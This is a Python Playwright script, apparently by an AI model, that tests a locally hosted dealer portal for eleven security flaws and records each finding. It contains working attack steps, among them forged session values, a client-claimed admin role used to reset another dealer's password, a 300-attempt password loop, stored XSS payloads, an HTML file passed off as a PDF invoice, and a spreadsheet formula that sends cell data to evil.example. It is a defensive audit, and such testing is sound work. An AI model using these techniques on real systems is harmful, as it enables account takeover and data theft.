import sys, re, json, base64, time; sys.path.insert(0,'/home/claude')
from playwright.sync_api import sync_playwright
BASE='http://127.0.0.1:8766/'; A=BASE+'dealer-portal/admin/index.html'; D=BASE+'dealer-portal/index.html'
R={}   # results: id -> (verdict, evidence)
def rec(i,v,e=''): R[i]=(v,str(e)[:260]); print(f'{v:10} {i}  {str(e)[:200]}')
def b64(s): return base64.b64encode(s.encode()).decode()
INIT="localStorage.setItem('sel.v2.keepdemo','1'); window.__x={};"
with sync_playwright() as pw:
    b=pw.chromium.launch(); ctx=b.new_context(viewport={'width':1440,'height':900}); ctx.add_init_script(INIT)
    def staff(u,p_):
        pg=ctx.new_page(); pg.goto(A); pg.fill('#sc',u); pg.fill('#sp',p_); pg.click('#aForm button[type=submit]'); pg.wait_for_timeout(1500); return pg
    def clr(p): p.evaluate("document.querySelectorAll('.overlay').forEach(x=>x.remove())")
    H=staff('ADMIN','admin123')
    # ---------- S1 passwords in plain text
    d=ctx.new_page(); d.goto(D); d.fill('#dcode','DEMO001'); d.fill('#dpass','demo123'); d.click('#loginBtn'); d.wait_for_timeout(1500)
    pw_seen=d.evaluate("(()=>{const ds=JSON.parse(localStorage.getItem('sel.v2.dealers')||'[]'), es=JSON.parse(localStorage.getItem('sel.v2.employees')||'[]'); return {dealers:ds.filter(x=>x.password).length, employees:es.filter(x=>x.password).length, sample:[ds[1]&&ds[1].code, ds[1]&&ds[1].password&&ds[1].password.length]}})()")
    rec('S1 passwords stored in plain text, readable by a logged-in DEALER', 'CONFIRMED' if pw_seen['dealers']>=3 and pw_seen['employees']>=3 else 'not found', pw_seen)
    # ---------- S2 dealer reads other dealers' data
    o=d.evaluate("(()=>({other:DB.listOrders('DEMO002').length, third:DB.listOrders('DEMO003').length, own:DB.listOrders('DEMO001').length, ledger:(DB.dealerLedger?DB.dealerLedger('DEMO002').length:null)}))()")
    rec('S2 dealer DEMO001 reads DEMO002 / DEMO003 orders (data isolation)', 'CONFIRMED' if o['other']>0 and o['third']>0 else 'not reproduced', o)
    # ---------- S3 act as Host without a password (forged session)
    ctx2=b.new_context(viewport={'width':1440,'height':900}); ctx2.add_init_script(INIT)
    f=ctx2.new_page(); f.goto(A); f.evaluate("sessionStorage.setItem('sel.v2.staff', JSON.stringify({code:'ADMIN',role:'admin',dept:'host',name:'Forged Host',tfa:true}))"); f.goto(A+'#/team'); f.reload(); f.wait_for_timeout(1500)
    menu=f.eval_on_selector_all('.vnav a','e=>e.map(x=>x.textContent.trim())'); rec('S3 become Host with NO password by writing the session value', 'CONFIRMED' if len(menu)>=8 and f.locator('main').inner_text().find('Team')>=0 else 'not reproduced', menu[:6])
    f2=ctx2.new_page(); f2.goto(D); f2.evaluate("sessionStorage.setItem('sel.v2.dealer','DEMO002')"); f2.goto(D); f2.wait_for_timeout(1500); rec('S3b become dealer DEMO002 with NO password (session = the dealer code)', 'CONFIRMED' if 'Welcome' in f2.inner_text('body') else 'not reproduced', re.sub(r'\s+',' ',f2.inner_text('body'))[:80])
    # ---------- S4 roles are an argument the caller supplies
    d.evaluate("DB.resetDealerPassword('DEMO003','Hijacked#99','ADMIN','admin')"); ok=d.evaluate("!!DB.verifyDealer('DEMO003','Hijacked#99')")
    rec('S4 a dealer calls an admin-only function by claiming role "admin" (password reset of another dealer)', 'CONFIRMED' if ok else 'not reproduced', 'new password accepted' if ok else '')
    # ---------- S5 no brute-force protection
    t0=time.time(); res=d.evaluate("(()=>{let s={ok:0,bad:0,locked:0}; for(let i=0;i<300;i++){const r=DB.dealerLoginStatus('DEMO001','wrong'+i); if(r==='locked'||r==='blocked') s.locked++; else s.bad++;} const final=DB.dealerLoginStatus('DEMO001','demo123'); return {s, final}})()")
    rec('S5 300 wrong passwords in a row: any lockout or delay?', 'CONFIRMED (no limit)' if res['s']['locked']==0 and res['final']=='ok' else 'limit present', res)
    # ---------- S6 account enumeration
    e1=d.evaluate("DB.dealerLoginStatus('NOSUCH99','x')"); e2=d.evaluate("DB.dealerLoginStatus('DEMO001','x')"); e3=d.evaluate("(()=>{DB.setDealerActive('DEMO002',false,'audit test','ADMIN','admin'); const r=DB.dealerLoginStatus('DEMO002','demo456'); const r2=DB.dealerLoginStatus('DEMO002','bad'); DB.setDealerActive('DEMO002',true,'','ADMIN','admin'); return [r,r2]})()")
    rec('S6 account enumeration: unknown code vs wrong password', 'OK (same answer)' if e1==e2 else 'LEAKS', (e1,e2,'deactivated-only-after-correct-password:',e3))
    # ---------- S7 stored XSS through fields other people type
    PAY='<img src=x onerror="window.__x[\'%s\']=1">'
    ev=lambda v: PAY%v
    H.evaluate("""(()=>{ const P=(v)=>'<img src=x onerror="window.__x[\\''+v+'\\']=1">';
      const ds=JSON.parse(localStorage.getItem('sel.v2.dealers')); ds[0].name=P('dealer.name'); ds[0].person=P('dealer.person'); ds[0].city=P('dealer.city'); ds[0].address=P('dealer.address'); localStorage.setItem('sel.v2.dealers',JSON.stringify(ds));
      const es=JSON.parse(localStorage.getItem('sel.v2.employees')); es[1].name=P('employee.name'); es[1].designation=P('employee.designation'); localStorage.setItem('sel.v2.employees',JSON.stringify(es));
      DB.addNews({kind:'news',title:P('news.title'),text:P('news.text')},'ADMIN','admin');
      const o=DB.listOrders('DEMO001')[0]; const oid=o.id; DB.setPackNote('DEMO001',oid,P('order.packNote'),'ADMIN','admin');
      try{ DB.addExEmployee({name:P('ex.name'),dept:'sales',designation:P('ex.des'),joinedOn:'2020-01-01',leftOn:'2021-01-01',reason:P('ex.reason'),notes:P('ex.notes')},'ADMIN','admin'); }catch(e){}
      try{ Sheets.load().links.push({id:'lx',title:P('sheet.linkTitle'),url:'https://docs.google.com/spreadsheets/d/1AbCdEfGhIjKlMnOpQrStUvWxYz0123456789/edit',mode:'view',scope:'all',dept:'host',by:'ADMIN',at:Date.now()}); }catch(e){}
    })()""")
    pages=['#/overview','#/dealers','#/team','#/team/ex','#/orders','#/finance','#/logistics','#/warehouse','#/hr','#/branding','#/mywork','#/whatsapp','#/sheets','#/sheets/dept%3Ahost','#/sheets/dept%3Asales','#/analytics']
    for p in pages:
        H.goto(A+p); H.reload(); H.wait_for_timeout(700); clr(H)
    H.goto(A+'#/orders'); H.reload(); H.wait_for_timeout(800); clr(H)
    try: H.locator('[data-a="oopen"]').first.click(); H.wait_for_timeout(600)
    except Exception: pass
    fired=H.evaluate("Object.keys(window.__x)")
    rec('S7 stored XSS: 14 fields filled with a script payload, 16 pages + an order pop-up visited', 'NOT REPRODUCED (all escaped)' if not fired else 'CONFIRMED', fired or 'no payload executed')
    # ---------- S8 uploaded invoice: HTML disguised as PDF
    html='<html><body><script>document.title="PWNED:"+Object.keys(localStorage).length</script></body></html>'
    oid=H.evaluate("DB.listOrders('DEMO001').filter(o=>o.payment.status==='Paid')[0].id")
    r=H.evaluate("([oid,data])=>{ try{ return JSON.stringify(DB.attachInvoiceFile('DEMO001',oid,{name:'inv.pdf',size:99,data:data,no:'INV/XSS'},'LOGISTICS')) }catch(e){ return 'ERR '+e } }",[oid,'data:text/html;base64,'+b64(html)])
    accepted=H.evaluate("(oid)=>{const o=DB.getOrder('DEMO001',oid); return !!(o.invoiceFile && /^data:text\\/html/.test(o.invoiceFile.data))}",oid)
    rec('S8a invoice upload accepts an HTML file renamed .pdf (no content check on invoices)', 'CONFIRMED' if accepted else 'rejected', r[:120])
    if accepted:
        H.goto(A+'#/logistics'); H.reload(); H.wait_for_timeout(1000); clr(H)
        try:
            with ctx.expect_popup(timeout=5000) as pp: H.evaluate("(()=>{const o=DB.getOrder('DEMO001','%s'); document.querySelector('body').insertAdjacentHTML('beforeend','<button id=pocv data-a=gvdoc data-t=inv data-c=DEMO001 data-id=%s>v</button>'); document.getElementById('pocv').click()})()"%(oid,oid))
            pop=pp.value; pop.wait_for_timeout(800); t=pop.title(); same=pop.evaluate("(()=>{try{return localStorage.getItem('sel.v2.dealers')!==null}catch(e){return 'blocked'}})()")
            rec('S8b opening that invoice runs its script inside the portal origin (stored XSS)', 'CONFIRMED' if t.startswith('PWNED') else 'script did not run', (t, 'can read portal storage:', same))
        except Exception as ex: rec('S8b opening that invoice runs its script inside the portal origin', 'inconclusive', str(ex)[:120])
    # ---------- S9 Google secret and other secrets readable by any signed-in user
    H.evaluate("localStorage.setItem('sel.v2.sheetscfg', JSON.stringify({url:'https://script.google.com/macros/s/AUDIT/exec',secret:'audit-secret-value',owner:'x@y.z'}))")
    seen=d.evaluate("(()=>{try{return JSON.parse(localStorage.getItem('sel.v2.sheetscfg')).secret}catch(e){return null}})()")
    rec('S9 Google script secret readable by any user of that browser (a DEALER session checked)', 'CONFIRMED' if seen=='audit-secret-value' else 'not reproduced', 'secret visible' if seen else seen)
    # ---------- S10 formula injection into sheets / Google
    posts=[]
    ctx.route('https://script.google.com/macros/s/AUDIT/exec', lambda rq: (posts.append(json.loads(rq.request.post_data or '{}')), rq.fulfill(status=200,content_type='application/json',body='{"ok":true}')))
    H.goto(A+'#/sheets'); H.reload(); H.wait_for_timeout(900); clr(H)
    H.evaluate("(()=>{ const ds=JSON.parse(localStorage.getItem('sel.v2.dealers')); ds[1].name='=HYPERLINK(\"https://evil.example/?x=\"&A2,\"click\")'; localStorage.setItem('sel.v2.dealers',JSON.stringify(ds)); })()")
    H.evaluate("Sheets.syncOrders(); Sheets.sendAll()"); H.wait_for_timeout(3000)
    items=[i for p in posts for i in p.get('items',[])]; hit=[i for i in items if any(str(c).startswith('=HYPERLINK') for c in i['row'])]
    cell=H.evaluate("(()=>{const t=Sheets.load().books['dept:host'].tabs.find(x=>x.name==='All orders'); const r=t.cells.find(r=>String(r[2]).startsWith('=HYPERLINK')); return r? r[2]:null})()")
    rec('S10 a dealer name starting with "=" is sent to Google as a formula (CSV/Sheets formula injection)', 'CONFIRMED' if hit else 'not reproduced', f'{len(hit)} rows carried a raw formula; portal cell holds: {str(cell)[:60]}')
    # ---------- S11 security headers / CSP
    html_text=H.evaluate("fetch(location.href.split('#')[0]).then(r=>r.text())"); hdr=H.evaluate("fetch(location.href.split('#')[0]).then(r=>Object.fromEntries([...r.headers.entries()]))")
    rec('S11 Content-Security-Policy / X-Frame-Options / nosniff present?', 'MISSING' if ('content-security-policy' not in hdr and 'Content-Security-Policy' not in html_text) else 'present', {k:hdr.get(k) for k in ['content-security-policy','x-frame-options','x-content-type-options','strict-transport-security']})
    print(json.dumps({k:v[0] for k,v in R.items()}, indent=0)); b.close()
